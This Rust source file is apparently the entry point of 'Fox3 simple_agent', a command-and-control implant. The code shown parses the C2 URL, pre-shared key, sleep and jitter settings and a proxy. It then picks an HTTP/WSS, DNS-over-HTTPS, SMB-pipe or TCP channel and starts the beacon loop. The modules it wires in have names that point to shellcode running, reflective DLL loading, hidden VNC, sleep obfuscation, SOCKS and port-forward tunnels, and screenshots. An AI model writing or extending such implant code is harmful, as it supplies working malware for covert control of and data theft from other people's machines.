mod agent;
mod bof;
mod ekko;
mod hvnc;
mod pipeline;
mod protocol;
mod rdll;
mod rportfwd;
mod screenshot;
mod shellcode;
mod socks;
mod transport;

use std::sync::atomic::{AtomicBool, Ordering};
use std::time::Duration;
use clap::Parser;

/// Global debug flag — when false, informational eprintln! messages are suppressed.
pub static DEBUG: AtomicBool = AtomicBool::new(false);

/// Debug print macro — only prints when `--debug` is passed on the command line.
/// Use this for informational/diagnostic messages. Keep real errors and startup
/// banners as plain `eprintln!`.
#[macro_export]
macro_rules! dbg_print {
    ($($arg:tt)*) => {
        if crate::DEBUG.load(std::sync::atomic::Ordering::Relaxed) {
            eprintln!($($arg)*);
        }
    };
}

/// Fox3 simple_agent.
///
/// Implements jittered-sleep + async tunnel mode: SOCKS, rportfwd, and
/// file transfers all run independently of the beacon sleep interval.
///
/// Supported transports: http (default, auto-upgrades to WSS), dns, smb, tcp
#[derive(Parser)]
#[command(author, version, about)]
struct Args {
    /// C2 server URL (https for http transport, DoH URL for dns transport)
    /// or TCP address (host:port for tcp transport).
    /// Not used for SMB transport (use --smb-pipe instead).
    #[arg(short, long, default_value = "https://127.0.0.1:443/")]
    url: String,

    /// Transport protocol: http (auto-upgrades to WSS), dns, smb, tcp
    #[arg(long, default_value = "http")]
    transport: String,

    /// SMB named-pipe path (for --transport smb).
    /// Example: \\192.168.1.10\pipe\fox3
    #[arg(long, default_value = "")]
    smb_pipe: String,

    /// DNS domain (for --transport dns).
    #[arg(long, default_value = "fox3.local")]
    domain: String,

    /// Raw DNS server address for fallback (for --transport dns).
    #[arg(long, default_value = "127.0.0.1:5353")]
    dns_server: String,

    /// Pre-shared key configured on the listener
    #[arg(short, long, default_value = "fox3")]
    psk: String,

    /// Base sleep interval between check-ins in seconds (jitter is applied on top)
    #[arg(short, long, default_value_t = 5)]
    sleep: u64,

    /// Jitter percentage: actual sleep = sleep ± (sleep × jitter / 100).
    /// Range 0–50.  Default 0 (no jitter).
    #[arg(short, long, default_value_t = 0,
          value_parser = clap::value_parser!(u8).range(0..=50))]
    jitter: u8,

    /// Fast-poll interval (milliseconds) used while any tunnel is active.
    #[arg(long, default_value_t = 50)]
    tunnel_poll: u64,

    /// HTTP(S) proxy URL for http transport (e.g., http://proxy:8080).
    /// When set, HTTPS POSTs and WSS upgrades are tunneled through the proxy.
    #[arg(long, default_value = "")]
    proxy: String,

    /// Enable debug output (verbose logging to stderr).
    #[arg(long, default_value_t = false)]
    debug: bool,
}

fn main() -> anyhow::Result<()> {
    // Install rustls crypto provider (needed for direct rustls usage in WSS transport).
    let _ = rustls::crypto::ring::default_provider().install_default();

    let args = Args::parse();

    // Set global debug flag before any output
    if args.debug {
        DEBUG.store(true, Ordering::Relaxed);
    }

    // Pre-generate agent ID so DNS transport can embed it in subdomains.
    let agent_id = uuid::Uuid::new_v4();

    println!("[*] Fox3 simple_agent starting");
    println!("[*] Transport   : {}", args.transport);
    println!("[*] Sleep       : {}s ±{}%", args.sleep, args.jitter);
    println!("[*] Tunnel poll : {}ms", args.tunnel_poll);

    let t = match args.transport.as_str() {
        "smb" => {
            let pipe = if args.smb_pipe.is_empty() {
                anyhow::bail!("--smb-pipe required for smb transport");
            } else {
                args.smb_pipe.clone()
            };
            println!("[*] Pipe        : {}", pipe);
            transport::Transport::new_smb(pipe)?
        }
        "tcp" => {
            println!("[*] TCP addr    : {}", args.url);
            transport::Transport::new_tcp(args.url.clone())?
        }
        "dns" => {
            println!("[*] DoH URL     : {}", args.url);
            println!("[*] DNS server  : {}", args.dns_server);
            println!("[*] Domain      : {}", args.domain);
            transport::Transport::new_dns(
                args.url.clone(),
                args.dns_server.clone(),
                args.domain.clone(),
                agent_id,
            )?
        }
        _ => {
            println!("[*] URL         : {}", args.url);
            if !args.proxy.is_empty() {
                println!("[*] Proxy       : {}", args.proxy);
            }
            println!("[*] (WSS auto-upgrade enabled)");
            transport::Transport::new_http(args.url.clone(), args.proxy.clone())?
        }
    };

    let mut ag = agent::Agent::new_with_id(
        agent_id,
        t,
        args.psk,
        Duration::from_secs(args.sleep),
        args.jitter,
        Duration::from_millis(args.tunnel_poll),
    );

    println!("[*] Agent ID: {}", ag.id);
    ag.run()
}
